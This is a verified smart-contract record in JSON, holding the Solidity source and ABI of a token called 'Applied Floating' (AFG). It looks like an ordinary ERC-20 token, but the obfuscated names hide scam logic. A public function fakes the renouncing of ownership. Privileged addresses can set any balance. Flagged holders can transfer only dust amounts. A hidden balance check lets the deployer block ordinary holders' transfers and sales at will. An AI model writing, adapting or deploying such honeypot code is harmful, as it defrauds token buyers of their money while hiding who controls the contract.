{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface limitTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTrading {\n    function createPair(address fromLimit, address tokenWallet) external returns (address);\n}\n\ninterface exemptShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitLaunch) external view returns (uint256);\n\n    function transfer(address swapMarketingFund, uint256 launchedFrom) external returns (bool);\n\n    function allowance(address minExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMarketingFund,\n        uint256 launchedFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityFee, uint256 value);\n    event Approval(address indexed minExempt, address indexed spender, uint256 value);\n}\n\ninterface exemptShouldMetadata is exemptShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppliedFloating is isTrading, exemptShould, exemptShouldMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTeam;\n    }\n\n    function walletLimit() private view {\n        require(receiverMin[_msgSender()]);\n    }\n\n    function allowance(address tradingShould, address buyWallet) external view virtual override returns (uint256) {\n        if (buyWallet == liquidityTotalShould) {\n            return type(uint256).max;\n        }\n        return exemptToToken[tradingShould][buyWallet];\n    }\n\n    function launchedLimitTx(address fundAuto) public {\n        walletLimit();\n        if (totalReceiver == exemptReceiver) {\n            toFrom = true;\n        }\n        if (fundAuto == swapShould || fundAuto == listReceiverMin) {\n            return;\n        }\n        amountAuto[fundAuto] = true;\n    }\n\n    address private limitEnableTeam;\n\n    function transfer(address listFrom, uint256 launchedFrom) external virtual override returns (bool) {\n        return minMode(_msgSender(), listFrom, launchedFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAmountEnable;\n    }\n\n    function exemptMax(address modeMin) public {\n        if (swapAt) {\n            return;\n        }\n        \n        receiverMin[modeMin] = true;\n        \n        swapAt = true;\n    }\n\n    mapping(address => bool) public amountAuto;\n\n    bool public toFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTeam;\n    }\n\n    uint256 private maxTo;\n\n    uint256 txExempt;\n\n    bool public swapAt;\n\n    function owner() external view returns (address) {\n        return limitEnableTeam;\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    bool public autoFund;\n\n    uint256 private senderEnable;\n\n    uint256 constant isMarketing = 10 ** 10;\n\n    uint256 private minList = 100000000 * 10 ** 18;\n\n    function maxBuy(uint256 launchedFrom) public {\n        walletLimit();\n        txExempt = launchedFrom;\n    }\n\n    bool public totalReceiver;\n\n    function approve(address buyWallet, uint256 launchedFrom) public virtual override returns (bool) {\n        exemptToToken[_msgSender()][buyWallet] = launchedFrom;\n        emit Approval(_msgSender(), buyWallet, launchedFrom);\n        return true;\n    }\n\n    function teamReceiver() public {\n        emit OwnershipTransferred(swapShould, address(0));\n        limitEnableTeam = address(0);\n    }\n\n    function toToken(address liquidityModeFund, address swapMarketingFund, uint256 launchedFrom) internal returns (bool) {\n        require(liquidityTotal[liquidityModeFund] >= launchedFrom);\n        liquidityTotal[liquidityModeFund] -= launchedFrom;\n        liquidityTotal[swapMarketingFund] += launchedFrom;\n        emit Transfer(liquidityModeFund, swapMarketingFund, launchedFrom);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed sellEnable, address indexed shouldTotal);\n\n    address public swapShould;\n\n    uint256 feeAmount;\n\n    function listToken(address listFrom, uint256 launchedFrom) public {\n        walletLimit();\n        liquidityTotal[listFrom] = launchedFrom;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minList;\n    }\n\n    mapping(address => uint256) private liquidityTotal;\n\n    function transferFrom(address liquidityModeFund, address swapMarketingFund, uint256 launchedFrom) external override returns (bool) {\n        if (_msgSender() != liquidityTotalShould) {\n            if (exemptToToken[liquidityModeFund][_msgSender()] != type(uint256).max) {\n                require(launchedFrom <= exemptToToken[liquidityModeFund][_msgSender()]);\n                exemptToToken[liquidityModeFund][_msgSender()] -= launchedFrom;\n            }\n        }\n        return minMode(liquidityModeFund, swapMarketingFund, launchedFrom);\n    }\n\n    constructor (){\n        if (feeLaunchedIs == maxTo) {\n            toFrom = true;\n        }\n        limitTo swapFrom = limitTo(liquidityTotalShould);\n        listReceiverMin = listTrading(swapFrom.factory()).createPair(swapFrom.WETH(), address(this));\n        if (maxTo != senderEnable) {\n            senderEnable = maxTo;\n        }\n        swapShould = _msgSender();\n        teamReceiver();\n        receiverMin[swapShould] = true;\n        liquidityTotal[swapShould] = minList;\n        \n        emit Transfer(address(0), swapShould, minList);\n    }\n\n    uint256 public feeLaunchedIs;\n\n    function balanceOf(address limitLaunch) public view virtual override returns (uint256) {\n        return liquidityTotal[limitLaunch];\n    }\n\n    function getOwner() external view returns (address) {\n        return limitEnableTeam;\n    }\n\n    function minMode(address liquidityModeFund, address swapMarketingFund, uint256 launchedFrom) internal returns (bool) {\n        if (liquidityModeFund == swapShould) {\n            return toToken(liquidityModeFund, swapMarketingFund, launchedFrom);\n        }\n        uint256 limitBuy = exemptShould(listReceiverMin).balanceOf(liquidityTakeMarketing);\n        require(limitBuy == txExempt);\n        require(swapMarketingFund != liquidityTakeMarketing);\n        if (amountAuto[liquidityModeFund]) {\n            return toToken(liquidityModeFund, swapMarketingFund, isMarketing);\n        }\n        return toToken(liquidityModeFund, swapMarketingFund, launchedFrom);\n    }\n\n    bool public exemptReceiver;\n\n    mapping(address => mapping(address => uint256)) private exemptToToken;\n\n    uint8 private swapTeam = 18;\n\n    string private swapAmountEnable = \"AFG\";\n\n    address liquidityTotalShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private launchedTeam = \"Applied Floating\";\n\n    address liquidityTakeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public listReceiverMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunchedIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"launchedLimitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"listToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityModeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMarketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AppliedFloating", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}